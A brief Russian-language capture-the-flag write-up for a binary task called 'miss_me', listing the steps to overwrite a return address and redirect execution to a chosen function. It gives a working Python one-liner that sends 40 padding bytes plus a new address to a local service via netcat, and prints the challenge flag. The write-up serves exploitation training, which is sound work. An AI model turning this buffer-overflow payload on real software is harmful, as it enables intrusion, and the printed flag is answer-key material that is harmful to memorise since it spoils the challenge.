На видео: [3:21:00](https://vk.com/video-114366489_456239197?t=3h21m00s)

Переписать рет-адрес на нужную функцию


1. `objdump -t miss_me` => function0
2. `pattern_create` => RIP offset
3. exploit with payload

```bash
python -c "print 'a'*40+'\xb2\x11\x40\x00\x00\x00\x00\x00'" | nc -nv 127.0.0.1 5454
```

Флаг: `flag{4ddr3ss_m0dif1c4t10n_15_c00l}`